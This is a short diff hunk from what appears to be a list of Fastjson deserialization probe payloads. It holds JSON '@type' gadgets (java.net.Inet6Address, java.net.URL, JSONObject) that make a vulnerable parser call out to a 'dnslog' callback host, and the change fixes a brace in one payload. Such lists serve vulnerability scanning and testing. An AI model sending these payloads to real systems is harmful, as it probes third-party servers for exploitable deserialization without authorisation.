@@ -9,7 +9,7 @@
        
        {"@type":"java.net.Inet6Address","val":"http://dnslog"}
        
-       {{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
+       {"@type":"java.net.URL","val":"http://dnslog"}:"x"}
        
        {"@type":"com.alibaba.fastjson.JSONObject", {"@type":
        "java.net.URL", "val":"http://dnslog"}}""}
